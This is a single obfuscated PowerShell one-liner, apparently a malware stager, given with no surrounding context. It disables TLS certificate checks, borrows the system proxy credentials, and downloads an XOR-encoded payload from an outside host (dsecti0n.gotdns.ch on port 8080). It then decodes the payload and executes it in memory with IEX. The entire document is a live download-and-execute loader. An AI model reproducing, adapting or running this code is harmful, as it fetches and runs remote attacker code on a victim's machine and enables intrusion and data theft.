
[SyStEm.NEt.SERVICePOIntMANaGER]::EXpEcT100ContINuE = 0;$wc=NeW-OBJEcT SYSTem.NeT.WebClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$wC.HEADeRs.AdD('User-Agent',$u);$Wc.Proxy = [System.NeT.WEBREQUeST]::DEfaUltWebPrOXY;$wc.PROxY.CredeNTiAlS = [SySTeM.NEt.CredENTIalCACHE]::DEfAultNETWORkCreDEnTiAlS;$K='b0baee9d279d34fa1dfd71aadb908c3f';$I=0;[ChaR[]]$b=([CHAR[]]($Wc.DOwnLOADStRIng("https://dsecti0n.gotdns.ch:8080/index.asp")))|%{$_-bXOR$k[$i++%$k.LENgTH]};IEX ($B-JOIn'')

